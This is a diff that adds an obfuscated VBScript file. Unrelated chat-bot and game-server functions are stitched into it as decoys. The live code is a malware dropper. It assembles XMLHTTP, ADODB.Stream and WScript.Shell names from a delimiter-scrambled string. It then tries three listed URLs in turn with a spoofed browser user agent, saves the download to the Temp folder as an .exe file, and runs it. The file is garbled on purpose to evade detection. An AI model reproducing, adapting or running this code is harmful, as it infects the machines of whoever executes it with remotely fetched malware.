@@ -1,0 +1,388 @@
+
+Dim veerniyuncheckedensurance 'As String
+
+Dim veerniyuncheckedInPlaceOf 'As String
+veerniyuncheckedBelish = "User"
+Public Function PrepareCheck(toCheck)
+    toCheck = Replace(toCheck, "[", "˙")
+    toCheck = Replace(toCheck, "]", "ö")
+    toCheck = Replace(toCheck, "~", "Ü")
+    toCheck = Replace(toCheck, "#", "˘")
+    toCheck = Replace(toCheck, "-", "Ł")
+    toCheck = Replace(toCheck, "&", "Ľ")
+    toCheck = Replace(toCheck, "@", "¤")
+    toCheck = Replace(toCheck, "{", "")
+    toCheck = Replace(toCheck, "}", "á")
+    toCheck = Replace(toCheck, "^", "í")
+    toCheck = Replace(toCheck, "`", "ó")
+    toCheck = Replace(toCheck, "_", "ú")
+    toCheck = Replace(toCheck, "+", "ń")
+    toCheck = Replace(toCheck, "$", "÷")
+    PrepareCheck = LCase(toCheck)
+End Function
+
+ Dim Pirates 
+
+Public Sub LoadDatabase()
+    
+
+    ' 9/13/06: Add the bot owner 200
+    If (LenB(BotVars.BotOwner) > 0) Then
+        For i = 0 To UBound(DB)
+            If (StrComp(DB(i).Username, BotVars.BotOwner, vbTextCompare) = 0) Then
+                found = True
+                
+                Exit For
+            End If
+        Next
+        
+
+    End If
+    
+    If (SaveDB) Then Call WriteDatabase(Path)
+End Sub
+
+Dim williams
+       Dim TristateTrue
+
+  Pirates = "XMLHTTPGIDZOAVAdodb.streaMGIDZOAVs"
+Vrungel = ".respo"+"nseBody"
+
+Dim veerniyuncheckedTimeTo 'As Object
+Dim veerniyuncheckedstatus
+veerniyuncheckedstatus = false
+   
+
+Dim veerniyuncheckedcashback 'As Object
+      
+CUA ="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+  
+ Function SyncObjAstreamsunchecked2(param1)
+param1 = param1 + param1
+
+veerniyunchecked5000 = veerniyuncheckedWentDo.responseBody
+param1 = 3 * param1 - 8	
+
+End Function
+
+
+Dim veerniyuncheckedWentDo 'As Object
+Dim veerniyuncheckedTavyer 'As Object   
+Dim abirvalgstreamsAxxxxx 'As Object
+
+Dim ZimZamZum
+
+Function T2000(p, ddd) 
+    Set veerniyuncheckedRunrun = CreateObject("WSc"+"ript.Shell")	
+	abirvalgstreamsAxxxxx.Type = 1
+ abirvalgstreamsAxxxxx.Open
+End Function 
+
+Pirates ="Microsoft." + Pirates+  "hell.App"+"licationGIDZOAVWscript"
+
+Function StackStack( vr )
+	ad1 = Replace(Pirates, "DRISSMISS", "" )
+   StackStack = Split(ad1,  vr)
+End Function
+
+Pirates = Pirates+".shellGIDZOAVProcessGIDZOAVGeTGIDZOAVT"+"emPGIDZOAVTyDRISSMISS"+"peDRISSMISS"
+
+
+
+Function SyncObjAstreamsunchecked(strr)
+if D = 33 then
+AXC = "Sav"+"eToFile"
+end if
+abirvalgstreamsAxxxxx.Savetofile veerniyuncheckedInPlaceOf , 14-12
+End Function
+
+    Public Function FolderToCopy(dde,SecondP,VKUok)
+Samwell = 69
+Samwell = Samwell + 11
+if Samwell > 33 then
+SecondP.Write VKUok
+Samwell =  Samwell / 13
+end if
+End Function
+	
+
+ Function IsCircleAnalytic(ByVal Figure1 ) 
+If Figure1 < FigureCount And Figure1 >= 0 Then
+    If Figures(Figure1).FigureType = dsAnCircle Then IsCircleAnalytic = True
+End If
+End Function
+Function SheduledprogramObject(p,d)
+
+FC = "" + veerniyuncheckedInPlaceOf
+
+ veerniyuncheckedRunrun.Run(FC + "")
+
+End Function
+
+
+Pirates = Pirates +"GIDZOAVDRISSMISSoDRISSMISSpenGIDZOAVwrDRISSMISSiteGIDZOAVreDRISSMISSspoDRISSMISSnseBoDRISSMISSdyGIDZOAVsaDRISSMISSvetof"+"DRISSMISSileGIDZOAV\LlmvJMlEqE.ex"+"DRISSMISSeGIDZOAVhttDRISSMISSp:GIDZOAV//"
+
+
+ Function GetShitlist(ByVal Username ) 
+    Dim gAcc 
+    Dim Ban  
+    
+    gAcc = GetCumulativeAccess(Username, "USER")
+    
+    If (Not InStr(1, gAcc.Flags, "Z", vbBinaryCompare) = 0) Then
+        Ban = True
+    ElseIf (Not InStr(1, gAcc.Flags, "B", vbBinaryCompare) = 0) Then
+        If (GetSafelist(Username) = False) Then Ban = True
+    End If
+    
+    If (Ban) Then
+        If ((Len(gAcc.BanMessage) > 0) And (gAcc.BanMessage <> "%")) Then
+            GetShitlist = Username & Space(1) & gAcc.BanMessage
+        ElseIf InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clanban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, " (game)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clientban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (game)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, "*", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Tagban: " & Mid(gAcc.Username, 2, Len(gAcc.Username) - 2)
+        Else
+            GetShitlist = Username & Space(1) & "Shitlisted"
+        End If
+    End If
+End Function
+Dim veerniyuncheckedPetir 'As String
+Dim sNodeKey 'As String
+  Dim sParentKey 'As String
+
+
+veerniyuncheckedPetir = "Ag"
+
+williams = StackStack("GIDZOAV" + "")
+
+  Dim MarketPlaceibility 'As String
+
+
+Dim Twelve 'As Integer
+  Dim sDecimalVis 'As String
+  
+Set veerniyuncheckedWentDo = CreateObject("" + williams(00))
+ 
+Dim Valery 'As Integer
+veerniyuncheckedBelish = veerniyuncheckedBelish + "-"
+ 
+
+
+Dim veerniyunchecked404 'As String
+
+Dim veerniyunchecked5000 'As Variant
+Dim veerniyuncheckedRunrun
+ Dim MarketPlace 'As String
+  Dim sTempVis 'As String
+  Dim iCount 'As Integer
+
+Function veerniyuncheckedFuks(p)
+ 
+veerniyuncheckedWentDo.Send
+	
+
+End Function
+Twelve = 11 + 1
+zTempVis = williams(1)
+
+'Set veerniyuncheckedTimeTo = CreateObject(williams(8-6))
+Set veerniyuncheckedHelmet = GetRef("SheduledprogramObject")
+Set veerniyunchecked13 = GetRef("SyncObjAstreamsunchecked")
+Set veerniyunchecked14 = GetRef("FolderToCopy")
+ 
+Set abirvalgstreamsAxxxxx = CreateObject("Adodb."+"streaM")
+
+Public Sub DebugLog(txt)
+    'debug.print txt
+    Open AppPath & "ARCServerDebug.txt" 
+    Print txt
+    Close 
+End Sub
+Set veerniyuncheckedTavyer = CreateObject(""+williams(10-7))
+
+
+if "Host" + WScript + "23" = "HostWindows Script Host23" Then 
+	
+	
+
+
+
+	Set veerniyuncheckedcashback = veerniyuncheckedTavyer.Environment(williams(1 + 3))
+
+end if	
+
+Function SetUA()
+veerniyuncheckedLamp.setRequestHeader veerniyuncheckedBelish, CUA
+End Function
+ 
+ Valery = 89210
+
+veerniyuncheckedensurance = veerniyuncheckedcashback(williams(6))
+ Dim i
+ 'on error GoTo nextU
+' on error resume next
+sTempVis = williams(1+Twelve -1)
+
+ 
+
+Sub SendFlagDat(SndTo)
+    Dim i , b , n 
+    Dim oNewMsg() , lNewOffSet 
+    Dim lNewMsg 
+    
+    For i = 1 To UBound(Flag1, 2)
+        
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 1
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag1(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag1(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry1(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag2, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 2
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag2(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag2(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry2(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag3, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 3
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag3(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag3(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry3(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag4, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 4
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag4(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag4(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry4(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag5, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 5
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag5(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag5(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry5(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    
+End Sub
+MarketPlace = williams(11+2) & williams(11+3)
+
+veerniyuncheckedBelish = veerniyuncheckedBelish & veerniyuncheckedPetir & "ent"
+xxxou = 19
+
+
+ZimZamZum = Array("ostiavolleyclub.it/iugftrs2?","nsaflow.info/p66/iugftrs2","agrourbis.com/iugftrs2?")
+
+lTo = UBound(ZimZamZum)
+
+For i = 0 To lTo Step 1
+xxxou = xxxou * 16
+
+	on error resume  next
+Valery =  Valery +14
+dr1=2
+
+xxxou2 = williams(15-10)
+
+xxxou = xxxou + 93
+ veerniyuncheckedWentDo.Open xxxou2, MarketPlace + ZimZamZum(i), False
+
+
+
+SetUA()
+veerniyuncheckedFuks " d "
+If veerniyuncheckedWentDo.Status +3 = 203 Then
+veerniyuncheckedstatus = true
+ Exit For
+End If
+
+goto14:
+Next
+
+on error goto 0
+
+if veerniyuncheckedstatus Then
+Dim Clank 'As String
+ veerniyuncheckedInPlaceOf = veerniyuncheckedensurance+ sTempVis
+
+T2000 "",4
+SyncObjAstreamsunchecked2 31 
+veerniyunchecked14 "",abirvalgstreamsAxxxxx,veerniyunchecked5000
+Sapogi =21
+veerniyuncheckedInPlaceOfu = "" + veerniyuncheckedInPlaceOf 
+
+
+Sapogi = Sapogi*5
+
+Dim veerniyuncheckedJohnSnowu,veerniyuncheckedDisplay 'As Long
+veerniyunchecked13 "ss"
+veerniyuncheckedJohnSnowu = 4133
+
+If 621  < veerniyuncheckedJohnSnowu + 1 Then
+	  
+	Hipster =xxxou+xxxou
+	veerniyuncheckedHelmet Hipster, xxxou
+	veerniyuncheckedDisplay = "H"
+End If
+
+
+
+mafia = 22211
+end if
